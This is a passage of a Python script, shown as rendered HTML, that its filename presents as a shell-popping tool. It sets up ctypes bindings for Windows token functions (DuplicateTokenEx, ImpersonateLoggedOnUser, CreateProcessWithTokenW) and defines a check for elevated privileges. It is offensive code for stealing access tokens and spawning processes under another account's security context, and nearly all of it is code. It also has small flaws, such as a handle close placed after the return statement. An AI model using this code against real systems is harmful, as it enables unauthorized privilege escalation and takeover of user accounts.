        <td id="file-popshellslikeitsasaturday-py-L265" class="blob-num js-line-number" data-line-number="265"></td>
        <td id="file-popshellslikeitsasaturday-py-LC265" class="blob-code blob-code-inner js-file-line">GetProcessImageFileName.argtypes <span class="pl-k">=</span> [                                                 <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L266" class="blob-num js-line-number" data-line-number="266"></td>
        <td id="file-popshellslikeitsasaturday-py-LC266" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">HANDLE</span>,                                                              <span class="pl-c"><span class="pl-c">#</span> HANDLE hprocess,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L267" class="blob-num js-line-number" data-line-number="267"></td>
        <td id="file-popshellslikeitsasaturday-py-LC267" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">LPTSTR</span>,                                                              <span class="pl-c"><span class="pl-c">#</span> LPTSTR lpImageFileName,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L268" class="blob-num js-line-number" data-line-number="268"></td>
        <td id="file-popshellslikeitsasaturday-py-LC268" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">DWORD</span>                                                                <span class="pl-c"><span class="pl-c">#</span> DWORD  nSize</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L269" class="blob-num js-line-number" data-line-number="269"></td>
        <td id="file-popshellslikeitsasaturday-py-LC269" class="blob-code blob-code-inner js-file-line">                ]                                                                    <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L270" class="blob-num js-line-number" data-line-number="270"></td>
        <td id="file-popshellslikeitsasaturday-py-LC270" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span>  The ConvertSidToStringSid function converts a security identifier (SID) to a string format suitable for display, storage, or transmission.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L271" class="blob-num js-line-number" data-line-number="271"></td>
        <td id="file-popshellslikeitsasaturday-py-LC271" class="blob-code blob-code-inner js-file-line">ConvertSidToStringSidA <span class="pl-k">=</span> advapi32.ConvertSidToStringSidA                              <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa376399(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L272" class="blob-num js-line-number" data-line-number="272"></td>
        <td id="file-popshellslikeitsasaturday-py-LC272" class="blob-code blob-code-inner js-file-line">ConvertSidToStringSidA.restype <span class="pl-k">=</span> <span class="pl-c1">BOOL</span>                                                <span class="pl-c"><span class="pl-c">#</span> BOOL ConvertSidToStringSid</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L273" class="blob-num js-line-number" data-line-number="273"></td>
        <td id="file-popshellslikeitsasaturday-py-LC273" class="blob-code blob-code-inner js-file-line">ConvertSidToStringSidA.argtypes <span class="pl-k">=</span> [                                                  <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L274" class="blob-num js-line-number" data-line-number="274"></td>
        <td id="file-popshellslikeitsasaturday-py-LC274" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">PSID</span>,                                                                <span class="pl-c"><span class="pl-c">#</span> PSID   Sid,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L275" class="blob-num js-line-number" data-line-number="275"></td>
        <td id="file-popshellslikeitsasaturday-py-LC275" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">LPTSTR</span>                                                               <span class="pl-c"><span class="pl-c">#</span> LPTSTR *StringSid</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L276" class="blob-num js-line-number" data-line-number="276"></td>
        <td id="file-popshellslikeitsasaturday-py-LC276" class="blob-code blob-code-inner js-file-line">                ]                                                                    <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L277" class="blob-num js-line-number" data-line-number="277"></td>
        <td id="file-popshellslikeitsasaturday-py-LC277" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L278" class="blob-num js-line-number" data-line-number="278"></td>
        <td id="file-popshellslikeitsasaturday-py-LC278" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">LPSECURITY_ATTRIBUTES</span> <span class="pl-k">=</span> <span class="pl-c1">LPVOID</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L279" class="blob-num js-line-number" data-line-number="279"></td>
        <td id="file-popshellslikeitsasaturday-py-LC279" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> The DuplicateTokenEx function creates a new access token that duplicates an existing token. This function can create either a primary token or an impersonation token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L280" class="blob-num js-line-number" data-line-number="280"></td>
        <td id="file-popshellslikeitsasaturday-py-LC280" class="blob-code blob-code-inner js-file-line">DuplicateTokenEx <span class="pl-k">=</span> advapi32.DuplicateTokenEx                                          <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L281" class="blob-num js-line-number" data-line-number="281"></td>
        <td id="file-popshellslikeitsasaturday-py-LC281" class="blob-code blob-code-inner js-file-line">DuplicateTokenEx.restype  <span class="pl-k">=</span> <span class="pl-c1">BOOL</span>                                                     <span class="pl-c"><span class="pl-c">#</span> BOOL WINAPI DuplicateTokenEx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L282" class="blob-num js-line-number" data-line-number="282"></td>
        <td id="file-popshellslikeitsasaturday-py-LC282" class="blob-code blob-code-inner js-file-line">DuplicateTokenEx.argtypes <span class="pl-k">=</span> [                                                        <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L283" class="blob-num js-line-number" data-line-number="283"></td>
        <td id="file-popshellslikeitsasaturday-py-LC283" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">HANDLE</span>,                                                              <span class="pl-c"><span class="pl-c">#</span> HANDLE                       hExistingToken,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L284" class="blob-num js-line-number" data-line-number="284"></td>
        <td id="file-popshellslikeitsasaturday-py-LC284" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">DWORD</span>,                                                               <span class="pl-c"><span class="pl-c">#</span> DWORD                        dwDesiredAccess,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L285" class="blob-num js-line-number" data-line-number="285"></td>
        <td id="file-popshellslikeitsasaturday-py-LC285" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">LPSECURITY_ATTRIBUTES</span>,                                               <span class="pl-c"><span class="pl-c">#</span> LPSECURITY_ATTRIBUTES        lpTokenAttributes,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L286" class="blob-num js-line-number" data-line-number="286"></td>
        <td id="file-popshellslikeitsasaturday-py-LC286" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">SECURITY_IMPERSONATION_LEVEL</span>,                                        <span class="pl-c"><span class="pl-c">#</span> SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L287" class="blob-num js-line-number" data-line-number="287"></td>
        <td id="file-popshellslikeitsasaturday-py-LC287" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">TOKEN_TYPE</span>,                                                          <span class="pl-c"><span class="pl-c">#</span> TOKEN_TYPE                   TokenType,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L288" class="blob-num js-line-number" data-line-number="288"></td>
        <td id="file-popshellslikeitsasaturday-py-LC288" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">PHANDLE</span>                                                              <span class="pl-c"><span class="pl-c">#</span> PHANDLE                      phNewToken</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L289" class="blob-num js-line-number" data-line-number="289"></td>
        <td id="file-popshellslikeitsasaturday-py-LC289" class="blob-code blob-code-inner js-file-line">                ]                                                                    <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L290" class="blob-num js-line-number" data-line-number="290"></td>
        <td id="file-popshellslikeitsasaturday-py-LC290" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L291" class="blob-num js-line-number" data-line-number="291"></td>
        <td id="file-popshellslikeitsasaturday-py-LC291" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> The ImpersonateLoggedOnUser function lets the calling thread impersonate the security context of a logged-on user. The user is represented by a token handle.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L292" class="blob-num js-line-number" data-line-number="292"></td>
        <td id="file-popshellslikeitsasaturday-py-LC292" class="blob-code blob-code-inner js-file-line">ImpersonateLoggedOnUser <span class="pl-k">=</span> advapi32.ImpersonateLoggedOnUser                            <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L293" class="blob-num js-line-number" data-line-number="293"></td>
        <td id="file-popshellslikeitsasaturday-py-LC293" class="blob-code blob-code-inner js-file-line">ImpersonateLoggedOnUser.restype <span class="pl-k">=</span> <span class="pl-c1">BOOL</span>                                               <span class="pl-c"><span class="pl-c">#</span> BOOL WINAPI ImpersonateLoggedOnUser</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L294" class="blob-num js-line-number" data-line-number="294"></td>
        <td id="file-popshellslikeitsasaturday-py-LC294" class="blob-code blob-code-inner js-file-line">ImpersonateLoggedOnUser.argtypes <span class="pl-k">=</span> [                                                 <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L295" class="blob-num js-line-number" data-line-number="295"></td>
        <td id="file-popshellslikeitsasaturday-py-LC295" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">HANDLE</span>                                                               <span class="pl-c"><span class="pl-c">#</span> HANDLE hToken</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L296" class="blob-num js-line-number" data-line-number="296"></td>
        <td id="file-popshellslikeitsasaturday-py-LC296" class="blob-code blob-code-inner js-file-line">                ]                                                                    <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L297" class="blob-num js-line-number" data-line-number="297"></td>
        <td id="file-popshellslikeitsasaturday-py-LC297" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">LPSTARTUPINFO</span>         <span class="pl-k">=</span> <span class="pl-c1">PSTARTUPINFO</span>         <span class="pl-k">=</span> POINTER(<span class="pl-c1">STARTUPINFO</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L298" class="blob-num js-line-number" data-line-number="298"></td>
        <td id="file-popshellslikeitsasaturday-py-LC298" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">LPPROCESS_INFORMATION</span> <span class="pl-k">=</span> <span class="pl-c1">PPROCESS_INFORMATION</span> <span class="pl-k">=</span> POINTER(<span class="pl-c1">PROCESS_INFORMATION</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L299" class="blob-num js-line-number" data-line-number="299"></td>
        <td id="file-popshellslikeitsasaturday-py-LC299" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Creates a new process and its primary thread. The new process runs in the security context of the specified token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L300" class="blob-num js-line-number" data-line-number="300"></td>
        <td id="file-popshellslikeitsasaturday-py-LC300" class="blob-code blob-code-inner js-file-line">CreateProcessWithToken <span class="pl-k">=</span> advapi32.CreateProcessWithTokenW                             <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms682434(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L301" class="blob-num js-line-number" data-line-number="301"></td>
        <td id="file-popshellslikeitsasaturday-py-LC301" class="blob-code blob-code-inner js-file-line">CreateProcessWithToken.restype <span class="pl-k">=</span> <span class="pl-c1">BOOL</span>                                                <span class="pl-c"><span class="pl-c">#</span> BOOL WINAPI CreateProcessWithTokenW</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L302" class="blob-num js-line-number" data-line-number="302"></td>
        <td id="file-popshellslikeitsasaturday-py-LC302" class="blob-code blob-code-inner js-file-line">CreateProcessWithToken. argtypes <span class="pl-k">=</span> [                                                 <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L303" class="blob-num js-line-number" data-line-number="303"></td>
        <td id="file-popshellslikeitsasaturday-py-LC303" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">HANDLE</span>,                                                              <span class="pl-c"><span class="pl-c">#</span> HANDLE                hToken,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L304" class="blob-num js-line-number" data-line-number="304"></td>
        <td id="file-popshellslikeitsasaturday-py-LC304" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">DWORD</span>,                                                               <span class="pl-c"><span class="pl-c">#</span> DWORD                 dwLogonFlags,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L305" class="blob-num js-line-number" data-line-number="305"></td>
        <td id="file-popshellslikeitsasaturday-py-LC305" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">LPCWSTR</span>,                                                             <span class="pl-c"><span class="pl-c">#</span> LPCWSTR               lpApplicationName,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L306" class="blob-num js-line-number" data-line-number="306"></td>
        <td id="file-popshellslikeitsasaturday-py-LC306" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">LPWSTR</span>,                                                              <span class="pl-c"><span class="pl-c">#</span> LPWSTR                lpCommandLine,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L307" class="blob-num js-line-number" data-line-number="307"></td>
        <td id="file-popshellslikeitsasaturday-py-LC307" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">DWORD</span>,                                                               <span class="pl-c"><span class="pl-c">#</span> DWORD                 dwCreationFlags,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L308" class="blob-num js-line-number" data-line-number="308"></td>
        <td id="file-popshellslikeitsasaturday-py-LC308" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">LPCWSTR</span>,                                                             <span class="pl-c"><span class="pl-c">#</span> LPVOID                lpEnvironment,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L309" class="blob-num js-line-number" data-line-number="309"></td>
        <td id="file-popshellslikeitsasaturday-py-LC309" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">LPCWSTR</span>,                                                             <span class="pl-c"><span class="pl-c">#</span> LPCWSTR               lpCurrentDirectory,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L310" class="blob-num js-line-number" data-line-number="310"></td>
        <td id="file-popshellslikeitsasaturday-py-LC310" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">LPSTARTUPINFO</span>,                                                       <span class="pl-c"><span class="pl-c">#</span> LPSTARTUPINFOW        lpStartupInfo,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L311" class="blob-num js-line-number" data-line-number="311"></td>
        <td id="file-popshellslikeitsasaturday-py-LC311" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">LPPROCESS_INFORMATION</span>                                                <span class="pl-c"><span class="pl-c">#</span> LPPROCESS_INFORMATION lpProcessInfo</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L312" class="blob-num js-line-number" data-line-number="312"></td>
        <td id="file-popshellslikeitsasaturday-py-LC312" class="blob-code blob-code-inner js-file-line">                ]                                                                    <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L313" class="blob-num js-line-number" data-line-number="313"></td>
        <td id="file-popshellslikeitsasaturday-py-LC313" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L314" class="blob-num js-line-number" data-line-number="314"></td>
        <td id="file-popshellslikeitsasaturday-py-LC314" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Closes an open object handle.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L315" class="blob-num js-line-number" data-line-number="315"></td>
        <td id="file-popshellslikeitsasaturday-py-LC315" class="blob-code blob-code-inner js-file-line">CloseHandle <span class="pl-k">=</span> kernel32.CloseHandle                                                    <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L316" class="blob-num js-line-number" data-line-number="316"></td>
        <td id="file-popshellslikeitsasaturday-py-LC316" class="blob-code blob-code-inner js-file-line">CloseHandle.restype <span class="pl-k">=</span> <span class="pl-c1">BOOL</span>                                                           <span class="pl-c"><span class="pl-c">#</span> BOOL WINAPI CloseHandle</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L317" class="blob-num js-line-number" data-line-number="317"></td>
        <td id="file-popshellslikeitsasaturday-py-LC317" class="blob-code blob-code-inner js-file-line">CloseHandle.argtypes <span class="pl-k">=</span>  [                                                            <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L318" class="blob-num js-line-number" data-line-number="318"></td>
        <td id="file-popshellslikeitsasaturday-py-LC318" class="blob-code blob-code-inner js-file-line">               <span class="pl-c1">HANDLE</span>                                                                <span class="pl-c"><span class="pl-c">#</span> HANDLE hObject</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L319" class="blob-num js-line-number" data-line-number="319"></td>
        <td id="file-popshellslikeitsasaturday-py-LC319" class="blob-code blob-code-inner js-file-line">               ]                                                                     <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L320" class="blob-num js-line-number" data-line-number="320"></td>
        <td id="file-popshellslikeitsasaturday-py-LC320" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L321" class="blob-num js-line-number" data-line-number="321"></td>
        <td id="file-popshellslikeitsasaturday-py-LC321" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L322" class="blob-num js-line-number" data-line-number="322"></td>
        <td id="file-popshellslikeitsasaturday-py-LC322" class="blob-code blob-code-inner js-file-line"><span class="pl-k">def</span> <span class="pl-en">areAdminRightsEnabled</span>():</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L323" class="blob-num js-line-number" data-line-number="323"></td>
        <td id="file-popshellslikeitsasaturday-py-LC323" class="blob-code blob-code-inner js-file-line">    currentToken         <span class="pl-k">=</span> HANDLE()</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L324" class="blob-num js-line-number" data-line-number="324"></td>
        <td id="file-popshellslikeitsasaturday-py-LC324" class="blob-code blob-code-inner js-file-line">    OpenProcessToken(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L325" class="blob-num js-line-number" data-line-number="325"></td>
        <td id="file-popshellslikeitsasaturday-py-LC325" class="blob-code blob-code-inner js-file-line">                                   GetCurrentProcess(),                  <span class="pl-c"><span class="pl-c">#</span> _In_      ProcessHandle          A handle to the process whose access token is opened. The process must have the PROCESS_QUERY_INFORMATION access permission.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L326" class="blob-num js-line-number" data-line-number="326"></td>
        <td id="file-popshellslikeitsasaturday-py-LC326" class="blob-code blob-code-inner js-file-line">                                   <span class="pl-c1">TOKEN_READ</span>,                           <span class="pl-c"><span class="pl-c">#</span> _In_      DesiredAccess          Specifies an access mask that specifies the requested types of access to the access token. These requested access types are compared with the discretionary access control list (DACL) of the token to determine which accesses are granted or denied.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L327" class="blob-num js-line-number" data-line-number="327"></td>
        <td id="file-popshellslikeitsasaturday-py-LC327" class="blob-code blob-code-inner js-file-line">                                   byref(currentToken))                  <span class="pl-c"><span class="pl-c">#</span> _Out_     TokenHandle            A pointer to a handle that identifies the newly opened access token when the function returns.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L328" class="blob-num js-line-number" data-line-number="328"></td>
        <td id="file-popshellslikeitsasaturday-py-LC328" class="blob-code blob-code-inner js-file-line">    TokenInformation <span class="pl-k">=</span> DWORD()</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L329" class="blob-num js-line-number" data-line-number="329"></td>
        <td id="file-popshellslikeitsasaturday-py-LC329" class="blob-code blob-code-inner js-file-line">    ReturnLength     <span class="pl-k">=</span> DWORD()</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L330" class="blob-num js-line-number" data-line-number="330"></td>
        <td id="file-popshellslikeitsasaturday-py-LC330" class="blob-code blob-code-inner js-file-line">    cracknak69 <span class="pl-k">=</span> GetTokenInformation(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L331" class="blob-num js-line-number" data-line-number="331"></td>
        <td id="file-popshellslikeitsasaturday-py-LC331" class="blob-code blob-code-inner js-file-line">                                   currentToken,                         <span class="pl-c"><span class="pl-c">#</span> _In_      TokenHandle            A handle to an access token from which information is retrieved. If TokenInformationClass specifies TokenSource, the handle must have TOKEN_QUERY_SOURCE access. For all other TokenInformationClass values, the handle must have TOKEN_QUERY access.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L332" class="blob-num js-line-number" data-line-number="332"></td>
        <td id="file-popshellslikeitsasaturday-py-LC332" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-c1">TOKEN_INFORMATION_CLASS</span>.TokenElevation,<span class="pl-c"><span class="pl-c">#</span> _In_      TokenInformationClass  Specifies a value from the TOKEN_INFORMATION_CLASS enumerated type to identify the type of information the function retrieves.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L333" class="blob-num js-line-number" data-line-number="333"></td>
        <td id="file-popshellslikeitsasaturday-py-LC333" class="blob-code blob-code-inner js-file-line">                                   byref(TokenInformation),              <span class="pl-c"><span class="pl-c">#</span> _Out_opt_ TokenInformation       A pointer to a buffer the function fills with the requested information. The structure put into this buffer depends upon the type of information specified by the TokenInformationClass parameter.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L334" class="blob-num js-line-number" data-line-number="334"></td>
        <td id="file-popshellslikeitsasaturday-py-LC334" class="blob-code blob-code-inner js-file-line">                                   sizeof(TokenInformation),             <span class="pl-c"><span class="pl-c">#</span> _In_      TokenInformationLength Specifies the size, in bytes, of the buffer pointed to by the TokenInformation parameter. If TokenInformation is NULL, this parameter must be zero.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L335" class="blob-num js-line-number" data-line-number="335"></td>
        <td id="file-popshellslikeitsasaturday-py-LC335" class="blob-code blob-code-inner js-file-line">                                   byref(ReturnLength))                  <span class="pl-c"><span class="pl-c">#</span> _Out_     ReturnLength           A pointer to a variable that receives the number of bytes needed for the buffer pointed to by the TokenInformation parameter.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L336" class="blob-num js-line-number" data-line-number="336"></td>
        <td id="file-popshellslikeitsasaturday-py-LC336" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> TokenInformation:</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L337" class="blob-num js-line-number" data-line-number="337"></td>
        <td id="file-popshellslikeitsasaturday-py-LC337" class="blob-code blob-code-inner js-file-line">        currenthandle <span class="pl-k">=</span> OpenProcess(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L338" class="blob-num js-line-number" data-line-number="338"></td>
        <td id="file-popshellslikeitsasaturday-py-LC338" class="blob-code blob-code-inner js-file-line">                                   <span class="pl-c1">PROCESS_ALL_ACCESS</span>,                   <span class="pl-c"><span class="pl-c">#</span> _In_      dwDesiredAccess       The access to the process object. This access right is checked against the security descriptor for the process. If the caller has enabled the SeDebugPrivilege privilege, the requested access is granted regardless of the contents of the security descriptor.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L339" class="blob-num js-line-number" data-line-number="339"></td>
        <td id="file-popshellslikeitsasaturday-py-LC339" class="blob-code blob-code-inner js-file-line">                                   <span class="pl-c1">False</span>,                                <span class="pl-c"><span class="pl-c">#</span> _In_      bInheritHandle        If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L340" class="blob-num js-line-number" data-line-number="340"></td>
        <td id="file-popshellslikeitsasaturday-py-LC340" class="blob-code blob-code-inner js-file-line">                                   GetCurrentProcessId())                <span class="pl-c"><span class="pl-c">#</span> _In_      dwProcessId           The identifier of the local process to be opened.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L341" class="blob-num js-line-number" data-line-number="341"></td>
        <td id="file-popshellslikeitsasaturday-py-LC341" class="blob-code blob-code-inner js-file-line">        BaseName <span class="pl-k">=</span> (c_char <span class="pl-k">*</span> <span class="pl-c1">MAX_PATH</span>)()</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L342" class="blob-num js-line-number" data-line-number="342"></td>
        <td id="file-popshellslikeitsasaturday-py-LC342" class="blob-code blob-code-inner js-file-line">        GetModuleBaseNameA(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L343" class="blob-num js-line-number" data-line-number="343"></td>
        <td id="file-popshellslikeitsasaturday-py-LC343" class="blob-code blob-code-inner js-file-line">                                   currenthandle,                        <span class="pl-c"><span class="pl-c">#</span> _In_      hProcess,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L344" class="blob-num js-line-number" data-line-number="344"></td>
        <td id="file-popshellslikeitsasaturday-py-LC344" class="blob-code blob-code-inner js-file-line">                                   <span class="pl-c1">None</span>,                                 <span class="pl-c"><span class="pl-c">#</span> _In_opt_  hModule,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L345" class="blob-num js-line-number" data-line-number="345"></td>
        <td id="file-popshellslikeitsasaturday-py-LC345" class="blob-code blob-code-inner js-file-line">                                   byref(BaseName),                      <span class="pl-c"><span class="pl-c">#</span> _Out_     lpBaseName,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L346" class="blob-num js-line-number" data-line-number="346"></td>
        <td id="file-popshellslikeitsasaturday-py-LC346" class="blob-code blob-code-inner js-file-line">                                   sizeof(BaseName))                     <span class="pl-c"><span class="pl-c">#</span> _In_      nSize</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L347" class="blob-num js-line-number" data-line-number="347"></td>
        <td id="file-popshellslikeitsasaturday-py-LC347" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">&quot;</span>[+] Process<span class="pl-pds">&quot;</span></span>, BaseName.value,<span class="pl-s"><span class="pl-pds">&quot;</span>has elevated privileges.. continuing<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L348" class="blob-num js-line-number" data-line-number="348"></td>
        <td id="file-popshellslikeitsasaturday-py-LC348" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">bool</span>(TokenInformation)                                   <span class="pl-c"><span class="pl-c">#</span>  NULL pointers have a False boolean value</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L349" class="blob-num js-line-number" data-line-number="349"></td>
        <td id="file-popshellslikeitsasaturday-py-LC349" class="blob-code blob-code-inner js-file-line">    CloseHandle(currentToken)                                            <span class="pl-c"><span class="pl-c">#</span> _In_      hObject              A valid handle to an open object.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L350" class="blob-num js-line-number" data-line-number="350"></td>
        <td id="file-popshellslikeitsasaturday-py-LC350" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L351" class="blob-num js-line-number" data-line-number="351"></td>
